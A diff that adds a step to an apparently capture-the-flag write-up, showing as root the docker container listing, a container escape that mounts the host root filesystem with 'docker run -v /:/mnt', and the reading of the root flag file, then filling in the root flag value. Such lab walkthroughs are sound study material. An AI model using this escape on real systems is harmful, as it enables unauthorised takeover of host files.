@@ -392,7 +392,50 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 bash-5.0# 
 ````
 
+````
+# docker ps
+docker ps
+CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
+852f446bce42        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   7 hours ago         Up 7 hours          127.0.0.1:443->443/tcp, 127.0.0.1:4566->4566/tcp, 127.0.0.1:4571->4571/tcp, 127.0.0.1:8080->8080/tcp   localstack_main
+
+# docker image ls
+REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
+localstack/localstack-full   0.12.6              7085b5de9f7c        8 months ago        888MB
+localstack/localstack-full   <none>              0601ea177088        13 months ago       882MB
+lambci/lambda                nodejs12.x          22a4ada8399c        13 months ago       390MB
+lambci/lambda                nodejs10.x          db93be728e7b        13 months ago       385MB
+lambci/lambda                nodejs8.10          5754fee26e6e        13 months ago       813MB
+````
+
+I’ll try to start one of these containers with -v /:/mnt which will mount the root / to /mnt inside the container. 
+````
+# docker run -d -v /:/mnt -it 0601ea177088
+docker run -d -v /:/mnt -it 0601ea177088
+b320da8ba13c23fe4e6a4ab8d0f935c641e0bc706dd09a348524c3bcfe094e59
+
+
+bash-5.0# docker ps
+CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
+b320da8ba13c        0601ea177088                        "docker-entrypoint.sh"   5 minutes ago       Up 5 minutes        4566/tcp, 4571/tcp, 8080/tcp                                                                           interesting_fermat
+852f446bce42        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   8 hours ago         Up 8 hours          127.0.0.1:443->443/tcp, 127.0.0.1:4566->4566/tcp, 127.0.0.1:4571->4571/tcp, 127.0.0.1:8080->8080/tcp   localstack_main
+bash-5.0# 
+bash-5.0# 
+bash-5.0# docker exec -it b320da8ba13c bash
+bash-5.0# hostname
+b320da8ba13c
+bash-5.0# ls /mnt
+bin         etc         lib64       mnt         run         tmp
+boot        home        libx32      opt         sbin        usr
+cdrom       lib         lost+found  proc        srv         var
+dev         lib32       media       root        sys
+bash-5.0# ls /mnt/root/
+Desktop         docker.service  root.txt
+bash-5.0# cat /mnt/root/root.txt
+bd97095c84e01bc86ec04f08be824f38
+````
+
 
 # Secrets
+
 * FLAG_USER = c877918fc5f7cb38e0631f7849c20b1b
-* FLAG_ROOT = 
+* FLAG_ROOT = bd97095c84e01bc86ec04f08be824f38
